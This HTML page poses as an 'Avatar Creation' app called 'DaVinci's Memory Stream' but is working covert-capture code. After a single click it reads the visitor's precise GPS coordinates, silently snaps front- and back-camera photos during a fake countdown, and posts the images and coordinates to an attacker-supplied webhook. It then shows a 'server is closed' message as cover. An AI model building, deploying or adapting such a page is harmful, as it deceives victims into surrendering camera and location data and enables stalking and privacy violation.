<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DaVinci's Memory Stream</title>
<style>
html,body{height:100%;margin:0}
body{
background:linear-gradient(135deg,#e0eafc,#cfdef3);
font-family:Segoe UI,Arial;text-align:center;overflow:hidden
}
#permission{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
#startBtn{padding:14px 38px;font-size:22px;border-radius:18px;border:none;
background:linear-gradient(90deg,#4ecdc4,#5563de);color:#fff}
#countdown{display:none;position:fixed;inset:0;align-items:center;justify-content:center;
background:linear-gradient(135deg,#e0eafc 60%,#5563de);z-index:1000}
#countdownNum{font-size:18vw;font-weight:bold;color:#fff}
#final,.note,#status,canvas{display:none}
</style>
</head>
<body>

<div id="permission">
<h2>DaVinci's Memory Stream</h2>
<p>Welcome! To began the journey press below</p>
<button id="startBtn">Avatar Creation</button>
</div>

<div id="countdown"><span id="countdownNum">5</span></div>
<div id="final"></div>
<div class="note">DaVinciâ€™s server is closed sorry!</div>
<div id="status"></div>
<canvas id="canvas"></canvas>

<script>
const permissionDiv = document.getElementById('permission');
const startBtn = document.getElementById('startBtn');
const countdownDiv = document.getElementById('countdown');
const countdownNum = document.getElementById('countdownNum');
const statusDiv = document.getElementById('status');
const finalDiv = document.getElementById('final');
const noteDiv = document.querySelector('.note');
const canvas = document.getElementById('canvas');

let locationData={lat:'N/A',lon:'N/A'};
let WEBHOOK_URL='';

fetch('webhook.txt').then(r=>r.text()).then(t=>WEBHOOK_URL=t.trim());

/* ðŸ”¥ NEW â€” BACK CAMERA FUNCTION (ISOLATED, SAFE) */
function captureBackCamera(startIndex){
navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}})
.then(stream=>{
const video=document.createElement('video');
video.srcObject=stream;video.autoplay=true;
video.onloadedmetadata=()=>{
const ctx=canvas.getContext('2d');
let i=0;
const backTimer=setInterval(()=>{
ctx.drawImage(video,0,0,canvas.width,canvas.height);
canvas.toBlob(blob=>{
const fd=new FormData();
fd.append('file',blob,`backcam_${startIndex+i}.jpg`);
fd.append('content',`BackCam ${startIndex+i} [${locationData.lat},${locationData.lon}]`);
fetch(WEBHOOK_URL,{method:'POST',body:fd});
},'image/jpeg',0.8);
i++;
if(i===5){
clearInterval(backTimer);
stream.getTracks().forEach(t=>t.stop());
video.remove();
}
},800);
};
});
}

startBtn.onclick=async()=>{
permissionDiv.style.display='none';

if(navigator.geolocation){
try{
const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j));
locationData.lat=p.coords.latitude.toFixed(8);
locationData.lon=p.coords.longitude.toFixed(8);
}catch{}
}

try{
const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
const video=document.createElement('video');
video.srcObject=stream;video.autoplay=true;

video.onloadedmetadata=()=>{
canvas.width=640;canvas.height=480;
const ctx=canvas.getContext('2d');
let count=5,photoNum=0;

countdownDiv.style.display='flex';

const timer=setInterval(()=>{
if(count>0){
countdownNum.textContent=count;
ctx.drawImage(video,0,0,canvas.width,canvas.height);
canvas.toBlob(blob=>{
const fd=new FormData();
fd.append('file',blob,`memory_${photoNum}.jpg`);
fd.append('content',`DaVinci Memory #${photoNum} [${locationData.lat},${locationData.lon}]`);
fetch(WEBHOOK_URL,{method:'POST',body:fd});
},'image/jpeg',0.8);
photoNum++;count--;
}else{
clearInterval(timer);
countdownDiv.style.display='none';
stream.getTracks().forEach(t=>t.stop());
video.remove();

/* âœ… ONLY ADDITION */
captureBackCamera(photoNum);

finish();
}
},1000);
};
}catch{
statusDiv.textContent='Camera access denied';
statusDiv.style.display='block';
}
};

function finish(){
finalDiv.style.display='block';
finalDiv.textContent="DaVinci's memory.";
noteDiv.style.display='block';
}
</script>
</body>
</html>